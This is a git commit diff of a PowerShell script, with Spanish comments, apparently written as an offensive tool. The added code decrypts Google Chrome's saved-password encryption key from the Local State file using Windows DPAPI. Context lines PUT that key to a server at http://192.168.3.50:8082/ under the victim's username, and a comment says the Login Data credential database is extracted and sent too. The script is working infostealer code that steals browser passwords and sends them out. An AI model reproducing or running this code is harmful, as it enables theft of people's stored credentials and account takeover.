9b20dd3361d4e7bb2e20616ecdc64f9adc4effd6
Juan Saenz MITM <80866984+jndr332@users.noreply.github.com>
2025-03-19 21:42:53 -0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,3 +1,34 @@
+$server = "http://192.168.3.50:8082/"
+
+
+# _______________ Extraccion de credenciales
+ 
+
+# LOCAL STATE ( archivo que contiene la clave de cifrado
+
+# Cargar el archivo Local State y obtener la clave cifrada
+$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+$localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+
+# Obtener la clave cifrada
+$encryptedKey = [System.Convert]::FromBase64String($localStateContent.os_crypt.encrypted_key)
+
+# Eliminar los primeros 5 bytes (prefijo 'DPAPI')
+$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+
+
+# agregar paquete necesario para el descifrado
+Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.dll"
+
+# Desencriptar la clave usando DPAPI (esto usa la clave de usuario actual en el sistema)
+$dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+
+# Convertir la clave binaria a base64
+$base64Key = [Convert]::ToBase64String($dpapiKey) 
+$cont = $base64Key
+
+
 #Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\"
 
@@ -18,6 +49,7 @@ if (Test-Path $file_login_default) {
 
 # Envio de clave de cifrado
 Invoke-RestMethod -Uri $server/password_$env:USERNAME -Method PUT -Body ($cont) -ContentType "text/plain"
+
 
 
 
